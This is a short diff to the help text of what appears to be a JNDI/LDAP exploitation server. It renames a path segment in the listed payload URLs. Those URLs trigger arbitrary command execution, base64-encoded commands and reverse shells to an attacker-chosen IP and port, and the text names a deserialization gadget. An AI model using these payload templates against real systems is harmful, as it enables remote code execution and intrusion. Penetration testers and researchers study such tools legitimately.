@@ -35,10 +35,10 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/basic/ReverseShell/[ip]/[port]  ---windows NOT supported
 
 [+] ByPass Queries: ldap://0.0.0.0:1389/bypass/[PayloadType]/[Type]/[Params], e.g.
-    ldap://0.0.0.0:1389/bypass/El/[cmd]
-    ldap://0.0.0.0:1389/bypass/El/base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/bypass/El/reverseshell/[ip]/[port]  ---windows NOT supported
-    ldap://0.0.0.0:1389/bypass/El/reverseshell2/[ip]/[port]  ---windows NOT supported
+    ldap://0.0.0.0:1389/bypass/EL/[cmd]
+    ldap://0.0.0.0:1389/bypass/EL/base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/bypass/EL/reverseshell/[ip]/[port]  ---windows NOT supported
+    ldap://0.0.0.0:1389/bypass/EL/reverseshell2/[ip]/[port]  ---windows NOT supported
     ----------------------------------------------------------------------------------------->
     [-] ByPass/Fuzz2 Payload that can be used: 
       CommonsBeanutils1
